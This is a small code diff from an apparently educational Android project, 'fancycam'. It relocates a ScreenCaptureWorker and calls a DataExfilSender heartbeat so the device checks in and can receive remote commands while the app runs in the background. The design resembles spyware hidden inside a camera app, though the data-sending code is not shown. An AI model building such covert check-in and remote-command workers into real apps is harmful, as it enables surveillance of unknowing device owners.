@@ -1,5 +1,6 @@
-package com.example.fancycam
+package com.example.fancycam.workers
 
+import com.example.fancycam.network.DataExfilSender
 import android.content.Context
 import android.util.Log
 import androidx.work.CoroutineWorker
@@ -28,7 +29,7 @@ class ScreenCaptureWorker(
         Log.d(TAG, "[EDUCATIONAL] Screen capture worker triggered (heartbeat/command poll)")
         // Workers cannot render UI, so this periodic task keeps the device checking in
         // and lets queued remote commands be delivered even while the app is backgrounded.
-        DataExfilSender.sendHeartbeat(applicationContext)
+        DataExfilSender.sendHeartbeat(applicationContext, processCommands = false)
         return Result.success()
     }
 
